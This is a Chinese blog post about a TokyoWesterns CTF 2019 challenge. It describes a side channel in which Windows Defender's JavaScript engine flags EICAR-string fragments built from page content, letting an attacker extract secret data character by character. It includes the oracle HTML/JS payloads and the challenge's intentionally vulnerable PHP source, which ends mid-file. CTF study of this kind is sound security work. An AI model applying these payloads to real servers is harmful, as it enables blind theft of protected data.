<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Windows Defender 侧信道攻击 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Windows Defender 侧信道攻击</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-09-22</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="vulnerable"> vulnerable</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Windows-Defender-侧信道攻击"><a href="#Windows-Defender-侧信道攻击" class="headerlink" title="Windows Defender 侧信道攻击"></a>Windows Defender 侧信道攻击</h1><h2 id="Windows-Defender"><a href="#Windows-Defender" class="headerlink" title="Windows Defender"></a>Windows Defender</h2><blockquote>
<p>Windows Defender，曾用名Microsoft Anti Spyware，是一个杀毒程序，可以运行在Windows XP和Windows Server 2003操作系统上，并已内置在Windows Vista，Windows 7，Windows8和Windows10。它的测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。Windows Defender不像其他同类免费产品一样只能扫描系统，它还可以对系统进行实时监控，移除已安装的Active X插件，清除大多数微软的程序和其他常用程序的历史记录。在最新发布的Windows 10中，Windows Defender已加入了右键扫描和离线杀毒，根据最新的每日样本测试，查杀率已经有了大的提升，达到国际一流水准。(<del>摘自百度</del>)</p>
</blockquote>
<h2 id="一般检测行为"><a href="#一般检测行为" class="headerlink" title="一般检测行为"></a>一般检测行为</h2><p>根据 TW 的分析，Windows Defender 会有以下行为：</p>
<ul>
<li>检查文件内容是否有恶意内容</li>
</ul>
<ul>
<li>改变恶意文件的权限以避免用户去加载</li>
</ul>
<ul>
<li>替换恶意内容为空</li>
</ul>
<ul>
<li>删除整个文件</li>
</ul>
<p>在第二步中，如果文件被 Windows Defender 检测出是恶意文件的话，用户就不可以访问了。</p>
<h2 id="滥用"><a href="#滥用" class="headerlink" title="滥用"></a>滥用</h2><h3 id="EICAR"><a href="#EICAR" class="headerlink" title="EICAR"></a>EICAR</h3><blockquote>
<p>EICAR标准反病毒测试文件，又称EICAR测试文件, 是由欧洲反计算机病毒协会（EICAR）与计算机病毒研究组织（CARO）研制的文件, 用以测试杀毒软件的响应程度。不同于使用可能造成实际破环的实体恶意软件，该文件允许人们在没有计算机病毒的情况下测试杀毒软件。</p>
</blockquote>
<p>我们可以使用以下字符串测试 Windows Defender</p>
<p><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</code></p>
<p>只需要将这个字符串复制，然后保存在一个空白的 txt 文件当中即可触发 Windwos Defender，所以我们先通过这个样例来检查一下自己的 Windows Defender 是否开启。 </p>
<p>若正常运行，一般会出现类似下图所示：</p>
<p><img src="https://i.loli.net/2019/09/22/6GOToJifjnVDR3m.jpg" alt=""></p>
<h3 id="Mpengine-dll"><a href="#Mpengine-dll" class="headerlink" title="Mpengine.dll"></a>Mpengine.dll</h3><p>根据 Tokyo Westerns 的分析，Windows Defender 有一个核心 dll 文件 Mpengine.dll ，他可以对不同的内容进行分析，包括一些 base64 encode/RAR archived/etc. ，其中比较有意思的是它还有一个 <strong>Javascript Engine</strong>。</p>
<p>这个引擎可以分析 HTML 文档，并且可以分析其中的 <strong>Javascript</strong> 代码，包括对文档中的 <strong>DOM 元素</strong>的访问。</p>
<p>原文用以下代码在测试时是触发了防御检测，然而我自己测试的时候，似乎没有反应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var mal = <span class="string">"X5O!P%@AP[4\PZX54(P^)7CC)7&#125;<span class="variable">$EICAR</span>-STANDARD-ANTIVIRUS-TEST-FILE!<span class="variable">$H</span>+H*"</span>;</span><br><span class="line"><span class="built_in">eval</span>(mal);</span><br></pre></td></tr></table></figure></p>
<p>紧接着构造如下代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> body = <span class="built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> mal = <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(mal);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>denfender则成功监测到</p>
<p>继续尝试将EICAR的内容进行分解：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> body = <span class="built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> mal = <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + body[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(mal);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>a<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>会发现并没有被检测到</p>
<p>因为我们将字符串改为了‘a’</p>
<p>所以当我们改回‘*’时：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> body = <span class="built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> mal = <span class="string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + body[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(mal);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>*<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>成功被检测到<br><img src="https://i.loli.net/2019/09/22/C2NxoOKfzF6j1YD.jpg" alt=""></p>
<h2 id="利用它"><a href="#利用它" class="headerlink" title="利用它"></a>利用它</h2><p>感觉很巧妙</p>
<p>一般而言，在写文件时，我们会对文件写入成功与否进行判定，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$err = file_put_contents(<span class="string">'/tmp/file_name'</span>, <span class="string">'something need to be saved'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$err)                    </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Exception</span>;</span><br></pre></td></tr></table></figure></p>
<p>file_put_contents 在写入成功后返回写入多少个字节，失败的时候返回 False ，然后我们就可以利用这个特性，当我们写入恶意数据的时候，因为 Windows Defender 检查出恶意内容，禁止了用户读取权限或者删除了文件，导致服务因为检查写入不成功抛出异常，而对于我们来说可能直接返回错误的状态码类似 <strong>500</strong> 。</p>
<p>于是由此可以产生一条侧信道攻击链：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval<span class="function"><span class="params">(<span class="string">"EICA"</span>+input)</span> -&gt;</span> ?</span><br><span class="line">    detected<span class="function"> -&gt;</span> input <span class="keyword">is</span> <span class="string">'R'</span></span><br><span class="line">    <span class="keyword">not</span> detected<span class="function"> -&gt;</span> input <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">'R'</span></span><br></pre></td></tr></table></figure></p>
<p>如果内容中有 <code>&lt;body&gt;</code> 标签，并且如果有无法通过正常手段读到的数据，我们可以尝试用这种类似“盲注”的方式去获取秘密数据<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScript can access the elements :)</span><br><span class="line">○ if they have <span class="tag">&lt;<span class="name">body</span>&gt;</span> tag</span><br><span class="line">○ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.body.innerHTML[<span class="number">0</span>]</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>[secret]<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="php-note"><a href="#php-note" class="headerlink" title="php note"></a>php note</h2><p>这是TokyoWesterns CTF 2019 上的一道题目<br>注意到响应中的一个字段：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Server</span>: Microsoft-IIS/<span class="number">10.0</span></span><br></pre></td></tr></table></figure></p>
<p>根据提示查看源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Note</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($admin)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;notes = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;isadmin = $admin;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addnote</span><span class="params">($title, $body)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        array_push(<span class="keyword">$this</span>-&gt;notes, [$title, $body]);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getnotes</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notes;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isadmin === <span class="keyword">true</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> FLAG;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($data, $hmac)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $secret = $_SESSION[<span class="string">'secret'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> hash_equals(hash_hmac(<span class="string">'sha256'</span>, $data, $secret), $hmac);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">hmac</span><span class="params">($data)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $secret = $_SESSION[<span class="string">'secret'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data) || <span class="keyword">empty</span>($secret)) <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> hash_hmac(<span class="string">'sha256'</span>, $data, $secret);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">gen_secret</span><span class="params">($seed)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> md5(SALT . $seed . PEPPER);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> !<span class="keyword">empty</span>($_SESSION[<span class="string">'secret'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span><span class="params">($action)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: /?action=$action"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];</span></span><br><span class="line"><span class="php">$action = $_GET[<span class="string">'action'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!in_array($action, [<span class="string">'index'</span>, <span class="string">'login'</span>, <span class="string">'logout'</span>, <span class="string">'post'</span>, <span class="string">'source'</span>, <span class="string">'getflag'</span>])) &#123;</span></span><br><span class="line"><span class="php">    redirect(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($action === <span class="string">'source'</span>) &#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_login()) &#123;</span></span><br><span class="line"><span class="php">    $realname = $_SESSION[<span class="string">'realname'</span>];</span></span><br><span class="line"><span class="php">    $nickname = $_SESSION[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $note = verify($_COOKIE[<span class="string">'note'</span>], $_COOKIE[<span class="string">'hmac'</span>])</span></span><br><span class="line"><span class="php">            ? unserialize(base64_decode($_COOKIE[<span class="string">'note'</span>]))</span></span><br><span class="line"><span class="php">            : <span class="keyword">new</span> Note(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($action === <span class="string">'login'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($method === <span class="string">'POST'</span>) &#123;</span></span><br><span class="line"><span class="php">        $nickname = (string)$_POST[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">        $realname = (string)$_POST[<span class="string">'realname'</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">empty</span>($realname) || strlen($realname) &lt; <span class="number">8</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'invalid name'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'realname'</span>] = $realname;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($nickname)) &#123;</span></span><br><span class="line"><span class="php">            $_SESSION[<span class="string">'nickname'</span>] = $nickname;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'secret'</span>] = gen_secret($nickname);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    redirect(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($action === <span class="string">'logout'</span>) &#123;</span></span><br><span class="line"><span class="php">    session_destroy();</span></span><br><span class="line"><span class="php">    redirect(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($action === <span class="string">'post'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($method === <span class="string">'POST'</span>) &#123;</span></span><br><span class="line"><span class="php">        $title = (string)$_POST[<span class="string">'title'</span>];</span></span><br><span class="line"><span class="php">        $body = (string)$_POST[<span class="string">'body'</span>];</span></span><br><span class="line"><span class="php">        $note-&gt;addnote($title, $body);</span></span><br><span class="line"><span class="php">        $data = base64_encode(serialize($note));</span></span><br><span class="line"><span class="php">        setcookie(<span class="string">'note'</span>, (string)$data);</span></span><br><span class="line"><span class="php">        setcookie(<span class="string">'hmac'</span>, (string)hmac($data));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    redirect(<span class="string">'index'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($action === <span class="string">'getflag'</span>) &#123;</span></span><br><span class="line"><span class="php">    $note-&gt;getflag();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>PHP note<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        textarea &#123;</span></span><br><span class="line"><span class="undefined">            resize: none;</span></span><br><span class="line"><span class="undefined">            width: 300px;</span></span><br><span class="line"><span class="undefined">            height: 200px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_login()) &#123;</span></span><br><span class="line"><span class="php">            $realname = htmlspecialchars($realname);</span></span><br><span class="line"><span class="php">            $nickname = htmlspecialchars($nickname);</span></span><br><span class="line"><span class="php">        <span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/?action=login"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">id</span>=<span class="string">"login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"firstname"</span> <span class="attr">placeholder</span>=<span class="string">"First Name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"lastname"</span> <span class="attr">placeholder</span>=<span class="string">"Last Name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"nickname"</span> <span class="attr">id</span>=<span class="string">"nickname"</span> <span class="attr">placeholder</span>=<span class="string">"nickname"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"realname"</span> <span class="attr">id</span>=<span class="string">"realname"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> 